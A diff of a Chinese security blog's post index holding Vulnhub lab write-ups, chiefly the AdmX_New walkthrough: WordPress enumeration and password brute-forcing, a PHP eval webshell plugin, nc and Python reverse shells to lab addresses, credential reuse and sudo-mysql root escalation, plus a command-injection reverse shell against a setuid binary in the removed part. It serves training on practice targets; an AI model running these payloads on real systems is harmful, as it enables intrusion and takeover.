-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat update_cloudav.c</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">char *freshclam=&quot;/usr/bin/freshclam&quot;;</span><br><span class="line"></span><br><span class="line">if (argc &lt; 2)&#123;</span><br><span class="line">printf(&quot;This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n&quot;);</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2);</span><br><span class="line">sprintf(command, &quot;%s %s&quot;, freshclam, argv[1]);</span><br><span class="line">setgid(0);</span><br><span class="line">setuid(0);</span><br><span class="line">system(command);</span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>其中有句：<code>This tool lets you update antivirus rules, Please supply command line arguments for freshclam</code>，翻译一下是说明可以在后面添加参数，尝试一下：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">随便加一个参数</span></span><br><span class="line">./update_cloudav &quot;123&quot; # 显示报错：ERROR: /var/log/clamav/freshclam.log is locked by another process</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不管他，尝试命令执行</span></span><br><span class="line">./update_cloudav &quot;123 | ls&quot; # 执行成功！</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>既然上述命令执行可以实现，再来一次 NC Shell 反弹：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 Kali 上开启两个监听端口</span></span><br><span class="line">nc -lvvp 6666</span><br><span class="line">nc -lvvp 7777</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在靶机上反弹</span></span><br><span class="line">./update_cloudav &quot;123 |nc 192.168.56.105 6666 |/bin/bash |nc 192.168.56.105 7777&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830222824468.png" alt="image-20230830222824468"></p>
-<ul>
-<li>提权成功！打靶结束。</li>
-</ul>
-<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul>
-<li>在使用 SQL 注入时，也可以使用 BurpSuite 进行爆破，但是很容易扫崩，需要控制一下速率。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>Vulnhub</category>
-      </categories>
-      <tags>
-        <tag>Vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Chronos</title>
     <url>/2023/08/14/Vulnhub_Kali/03.Chronos_20230814/</url>
     <content><![CDATA[<ul>
@@ -1122,6 +1122,296 @@
 <h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul>
 <li>在查看 NC 时，用 which nc 会直接卡住，建议用 ls &#x2F;bin。</li>
 <li>一旦出现页面不显示时间信息时，重启靶机。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>Vulnhub</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AdmX_New_20230815</title>
+    <url>/2023/08/15/Vulnhub_Kali/04.AdmX_New_20230815/</url>
+    <content><![CDATA[<ul>
+<li>填坑系列（四）启动，总体难度不大，主要是卡在 WordPress 那（这篇原文放在自己语雀了，所以下述时间会不对上）。</li>
+<li>靶机地址：<a href="https://download.vulnhub.com/admx/AdmX_new.7z">https://download.vulnhub.com/admx/AdmX_new.7z</a></li>
+<li>Vulnhub 的靶机都有一个特点，通常导入到 VMware Workstation 时都会获取不到 IP 地址，虽然可以进紧急模式中修改，但是太麻烦了，还是将 Kali 和靶机桥接吧。</li>
+</ul>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><ul>
+<li>由于将 Kali 与 VulnHub 使用 Virtual Box 仅主机网卡进行了桥接，所以使用 Kali 去扫描靶机。</li>
+<li>首先查看 Kali IP 地址：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.56.105  netmask 255.255.255.0  broadcast 192.168.56.255</span><br><span class="line">        inet6 fe80::adc5:106b:ff3c:9390  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:a8:8a:0b  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 24  bytes 10921 (10.6 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 549  bytes 40698 (39.7 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>扫描当前网段，发现靶机 IP 地址：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# arp-scan 192.168.56.0/24</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:a8:8a:0b, IPv4: 192.168.56.105</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:1a       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:d7:55:29       PCS Systemtechnik GmbH</span><br><span class="line">192.168.56.109  00:0c:29:23:07:8b       VMware, Inc.</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.940 seconds (131.96 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>继续使用 Nmap 扫描端口、开放服务等信息：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -p- 192.168.56.109</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-08 01:42 EST</span><br><span class="line">Nmap scan report for 192.168.56.109</span><br><span class="line">Host is up (0.00038s latency).</span><br><span class="line">Not shown: 65534 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:23:07:8B (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 117.67 seconds</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -p 80 -sV 192.168.56.109</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-08 01:44 EST</span><br><span class="line">Nmap scan report for 192.168.56.109</span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">MAC Address: 00:0C:29:23:07:8B (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 19.65 seconds</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>扫描出 8080 端口的 Web 服务，通常情况下不考虑 SSH 爆破，访问一下 Web 服务：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830234931326.png" alt="image-20230830234931326"></p>
+<h1 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h1><ul>
+<li>一个十分正常的 Apache 默认页面，使用 dirb 扫描一下站点目录：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.56.109/</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830234958769.png" alt="image-20230830234958769"></p>
+<ul>
+<li><p>发现一个 WordPress 目录，说明目标可能是由 WordPress 框架搭建的 Web 服务，代理挂到 BurpSuite 上进行查看：</p>
+<ul>
+<li>注：此处网卡出现问题，网卡连接至 NAT，地址为：192.168.1.139。</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.1.139/ -p 127.0.0.1:8080</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235030368.png" alt="image-20230830235030368"></p>
+<ul>
+<li>经过上述操作，发现访问 WordPress 目录时都是 3xx 的页面跳转行为：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235044724.png" alt="image-20230830235044724"></p>
+<h1 id="BurpSuite-匹配替换"><a href="#BurpSuite-匹配替换" class="headerlink" title="BurpSuite 匹配替换"></a>BurpSuite 匹配替换</h1><ul>
+<li>通过仔细查找，发现页面上还会去加载另一个 IP 地址资源，当访问 WordPress 页面是，会出现 <code>Connecting to 192.168.159.145</code>，说明是硬编码写入到页面中：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235104825.png" alt="image-20230830235104825"></p>
+<ul>
+<li><p>由于页面资源访问不到，查看后明显是本地资源，就是 IP 地址不对。</p>
+</li>
+<li><p>这里有两种解决方式：</p>
+<ul>
+<li>修改靶机 IP 网段（太浪费时间了）</li>
+<li>使用 BurpSuite 进行 IP 地址替换</li>
+</ul>
+</li>
+<li><p>依次点击 BurpSuite 中的：</p>
+<ul>
+<li><p>Proxy</p>
+</li>
+<li><p>Options</p>
+</li>
+<li><p>找到 Match and Replace（匹配和替换）</p>
+</li>
+<li><p>点击 Add（两条，一条 Body，一条 Header）</p>
+<ul>
+<li>Type：Response body 、Response header</li>
+<li>Match：192.168.159.145</li>
+<li>Replace：192.168.1.139</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235122289.png" alt="image-20230830235122289"></p>
+<ul>
+<li>添加完后，刷新页面即可，页面访问正常（后续操作 BurpSuite 不要关）：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235131640.png" alt="image-20230830235131640"></p>
+<h1 id="框架扫描"><a href="#框架扫描" class="headerlink" title="框架扫描"></a>框架扫描</h1><ul>
+<li>既然已经知道目标站点是 WordPress，使用 WpScan 扫一下：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.1.139/wordpress --proxy http://127.0.0.1:8080 --enumerate</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235147367.png" alt="image-20230830235147367"></p>
+<ul>
+<li>发现存在用户 admin，根据前面目录扫描结果发现了管理员登录页面：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.139/wordpress/wp-admin</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235202041.png" alt="image-20230830235202041"></p>
+<ul>
+<li>当使用 admin 账号进行测试时，也证实了 admin 账户的存在：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235217563.png" alt="image-20230830235217563"></p>
+<h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><ul>
+<li>使用 wpscan 进行暴力破解，前提需要先找到个好字典，这里使用 Kali 自带的 rockyou.txt：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压一下</span></span><br><span class="line">cd /usr/share/wordlist</span><br><span class="line">gzip -d rockyou.txt.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开始破解</span></span><br><span class="line">wpscan --url http://192.168.1.139/wordpress -U admin -P rockyou.txt --proxy http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235232661.png" alt="image-20230830235232661"></p>
+<ul>
+<li>经过了漫长的等待，破解出密码：<code>admin/adam14</code>，成功进入后台：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235247619.png" alt="image-20230830235247619"></p>
+<ul>
+<li>为了查看方便，将其修改为中文：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235255665.png" alt="image-20230830235255665"></p>
+<h1 id="插件传马"><a href="#插件传马" class="headerlink" title="插件传马"></a>插件传马</h1><ul>
+<li><p>通常对于 wp 后台有以下几种利用方式：</p>
+<ul>
+<li>文件上传（只针对特定 wp 版本）</li>
+<li>模板注入（无法修改页面）</li>
+<li>插件上传</li>
+</ul>
+</li>
+<li><p>现在本地编写 wp 插件：</p>
+<ul>
+<li>编写格式：<a href="https://www.wpdaxue.com/writing_a_plugin.html">https://www.wpdaxue.com/writing_a_plugin.html</a></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Plugin Name: WebShell</span></span><br><span class="line"><span class="comment">Plugin URI: https://yongz.github.io</span></span><br><span class="line"><span class="comment">Description: WP WebShell</span></span><br><span class="line"><span class="comment">Version: 1.0</span></span><br><span class="line"><span class="comment">Author: yonzg</span></span><br><span class="line"><span class="comment">Author URI: https://yongz.github.io</span></span><br><span class="line"><span class="comment">License: https://yongz.github.io</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235315340.png" alt="image-20230830235315340"></p>
+<ul>
+<li>由于 wp 接收插件是 zip 格式，需要进行压缩：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/tmp]</span><br><span class="line">└─# zip shell.zip shell.php</span><br><span class="line">  adding: shell.php (deflated 38%)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>进行插件上传：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235338061.png" alt="image-20230830235338061"></p>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235340626.png" alt="image-20230830235340626"></p>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235350015.png" alt="image-20230830235350015"></p>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235354655.png" alt="image-20230830235354655"></p>
+<ul>
+<li>插件已被启用，上传之后的访问地址为：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.139/wordpress/wp-content/plugins/shell.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>尝试是否能够进行命令执行：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.139/wordpress/wp-content/plugins/shell.php?cmd=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235417158.png" alt="image-20230830235417158"></p>
+<ul>
+<li>命令执行成功~，使用蚁剑进行连接（蚁剑安装过程略）：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235426740.png" alt="image-20230830235426740"></p>
+<ul>
+<li>连接成功！查找 flag 文件，在 <code>/home/wpadmin</code> 目录下找到了，但是权限不够，需要提权。</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235443152.png" alt="image-20230830235443152"></p>
+<h1 id="MSF-Shell-反弹"><a href="#MSF-Shell-反弹" class="headerlink" title="MSF Shell 反弹"></a>MSF Shell 反弹</h1><ul>
+<li>同理，使用 MSF 进行 Shell 反弹：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">search wp shell</span><br><span class="line">use 9</span><br><span class="line">set PASSWORD adam14</span><br><span class="line">set RHOSTS 192.168.1.139</span><br><span class="line">set TARGETURI /wordpress</span><br><span class="line">set USERNAME admin</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235506399.png" alt="image-20230830235506399"></p>
+<ul>
+<li>可以看出，也是使用插件上传的方式获取 Shell。</li>
+</ul>
+<h1 id="NC-Shell-反弹"><a href="#NC-Shell-反弹" class="headerlink" title="NC Shell 反弹"></a>NC Shell 反弹</h1><ul>
+<li><p>通过提权三部曲：</p>
+<ul>
+<li>内核提权（Linux wp 5.4.0-72-generic #80-Ubuntu SMP Mon Apr 12 17:35:00 UTC 2021 x86_64 x86_64 x86_64 GNU&#x2F;Linux 内核版本过高）</li>
+<li>Sudo 提权（需要密码）</li>
+<li>SUID 提权（没有符合的文件）</li>
+</ul>
+</li>
+<li><p>那就只能接着去信息收集了，由于是 WP 框架，很有可能是 LAMP 环境，去翻翻配置文件：</p>
+</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /var/www/html/wordpress/wp-config.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235525893.png" alt="image-20230830235525893"></p>
+<ul>
+<li>发现了数据库的账号密码：<code>admin/Wp_Admin#123</code>，登录一下：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -uadmin -pWp_Admin#123</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>结果发现，没啥用，蚁剑反弹的 Shell 没有回显。</li>
+<li>查看一下靶机是否安装有 NC：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235543037.png" alt="image-20230830235543037"></p>
+<ul>
+<li>发现存在 NC，但是是不带 -e 的版本。用 NC 串联反弹一个 Shell 回来：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 Kali 上开启两个 nc 监听</span></span><br><span class="line">nc -lvvp 4444</span><br><span class="line">nc -lvvp 5555</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在蚁剑上输入如下命令</span></span><br><span class="line">nc 192.168.1.136 4444 | /bin/bash | nc 192.168.1.136 5555</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235555924.png" alt="image-20230830235555924"></p>
+<h1 id="Python-Shell-反弹"><a href="#Python-Shell-反弹" class="headerlink" title="Python Shell 反弹"></a>Python Shell 反弹</h1><ul>
+<li>反弹成功！但是也不能进行回显，改用 Python 反弹，编写脚本 1.py：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((<span class="string">&quot;192.168.1.136&quot;</span>,<span class="number">4444</span>));</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>);</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>);</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>);</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235611950.png" alt="image-20230830235611950"></p>
+<ul>
+<li>反弹成功！并且可以进行交互，但是还是无法正常登陆 MySQL：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235620492.png" alt="image-20230830235620492"></p>
+<h1 id="Shell-升级"><a href="#Shell-升级" class="headerlink" title="Shell 升级"></a>Shell 升级</h1><ul>
+<li>此处需要升级一下 Shell：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看一下 Kali 与 靶机 的当前 Shell</span></span><br><span class="line">echo $0</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# echo $0</span><br><span class="line">/usr/bin/zsh</span><br><span class="line"></span><br><span class="line">www-data@wp:/var/www/html/wordpress$ echo $0</span><br><span class="line">echo $0</span><br><span class="line">/bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发现两者 Shell 环境不一致</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>开启升级操作：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1. 修改 Kali Shell 环境为 bash</span></span><br><span class="line">chsh -s /bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2. 修改后重启</span></span><br><span class="line">reboot</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3. 再次连接到 Python Shell，此处过程略</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">4. 连接 Shell 后使用 Ctrl + Z 将 Shell 挂起</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">5. Shell 挂起后输入如下命令改变本地终端设置，禁用 <span class="built_in">echo</span>，关闭输入输出</span></span><br><span class="line">stty raw -echo </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">6. 使用 <span class="built_in">fg</span> 将刚才挂起的 Shell 调用到前台（此处 <span class="built_in">fg</span> 命令在终端是不显示的）</span></span><br><span class="line">fg</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">7. 使用 <span class="built_in">export</span> 设置靶机终端的 Shell 环境变量</span></span><br><span class="line">export SHELL=/bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">8. 使用 <span class="built_in">export</span> 进行清屏设置</span></span><br><span class="line">export TERM=screen</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">9. 修改靶机终端大小</span></span><br><span class="line">stty rows 38 columns 126</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">10. 重启靶机终端</span></span><br><span class="line">reset</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>但是，这种方法不知道为什么，不能用，绝了。</li>
+</ul>
+<h1 id="数据库查找"><a href="#数据库查找" class="headerlink" title="数据库查找"></a>数据库查找</h1><ul>
+<li>但是的但是，经过我的多次尝试，在没回显的情况下，进入数据库在退出还是会有一定的回显：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235654720.png" alt="image-20230830235654720"></p>
+<ul>
+<li>意外之喜，经过多轮尝试，得到信息如下：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">show databases;</span></span><br><span class="line"></span><br><span class="line">Database</span><br><span class="line">information_schema</span><br><span class="line">wordpress</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">show tables;</span></span><br><span class="line"></span><br><span class="line">Tables_in_wordpress</span><br><span class="line">wp_commentmeta</span><br><span class="line">wp_comments</span><br><span class="line">wp_links</span><br><span class="line">wp_options</span><br><span class="line">wp_postmeta</span><br><span class="line">wp_posts</span><br><span class="line">wp_term_relationships</span><br><span class="line">wp_term_taxonomy</span><br><span class="line">wp_termmeta</span><br><span class="line">wp_terms</span><br><span class="line">wp_usermeta</span><br><span class="line">wp_users</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="keyword">select</span> * from wp_users;</span></span><br><span class="line">ID      user_login      user_pass       user_nicename   user_email      user_url        user_registered user_activation_key     user_status     display_name</span><br><span class="line">1       admin   $P$B1sw76mAze9nXcsYokmVjZ2y0zrTAR1      admin   admin@wordpress.org     http://192.168.159.145/wordpress        2021-05-11 07:30:47             0       admin</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>淦，没卵用，目前已知的密码就俩：adam14、Wp_Admin#123。</li>
+</ul>
+<h1 id="密码复用"><a href="#密码复用" class="headerlink" title="密码复用"></a>密码复用</h1><ul>
+<li>看看密码能不能复用了，查看一下当前靶机的所有用户：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">......</span><br><span class="line">wpadmin:x:1001:1001::/home/wpadmin:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>那就用上面两个密码，切换一下用户：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su wpadmin</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235749048.png" alt="image-20230830235749048"></p>
+<ul>
+<li>结果还真是，查看之前没权限查看的文件：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat local.txt</span><br><span class="line">153495edec1b606c24947b1335998bd9</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>得到第一个 <code>flag：153495edec1b606c24947b1335998bd9</code>。</li>
+</ul>
+<h1 id="SUDO-提权"><a href="#SUDO-提权" class="headerlink" title="SUDO 提权"></a>SUDO 提权</h1><ul>
+<li>用于不是 root 账户，决定再次提权，之前 sudo 密码，现有了：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sudo -l</span></span><br><span class="line">Matching Defaults entries for wpadmin on wp:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User wpadmin may run the following commands on wp:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/mysql -u root -D wordpress -p</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>可以看到在不需要密码的情况下执行 <code>/usr/bin/mysql -u root -D wordpress -p</code> 命令获得的是 root 权限（但其实还是需要密码）。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输入如下命令，密码随便输</span></span><br><span class="line">sudo /usr/bin/mysql -u root -D wordpress -p</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在 MySQL 5.x 中增加了 system 命令（Linux），简单的符号是 !，从而使 MySQL 可以执行系统的命令，尝试一下：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">system id; # uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>发现可以执行，那就直接切换 Shell：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">system /bin/bash;</span><br><span class="line">id # uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">cd /root</span><br><span class="line">ls # proof.txt snap</span><br><span class="line">cat proof.txt # 7efd721c8bfff2937c66235f2d0dbac1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>找到第二个 <code>flag：7efd721c8bfff2937c66235f2d0dbac1</code>。</li>
+</ul>
+<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul>
+<li>目录扫描容易把 Web 服务扫崩。</li>
+<li>Shell 升级命令解析：<a href="https://blog.csdn.net/weixin_46622976/article/details/124446922">https://blog.csdn.net/weixin_46622976&#x2F;article&#x2F;details&#x2F;124446922</a></li>
 </ul>
 ]]></content>
       <categories>
@@ -1884,296 +2174,6 @@
       </categories>
       <tags>
         <tag>摸爬滚打</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>AdmX_New_20230815</title>
-    <url>/2023/08/15/Vulnhub_Kali/04.AdmX_New_20230815/</url>
-    <content><![CDATA[<ul>
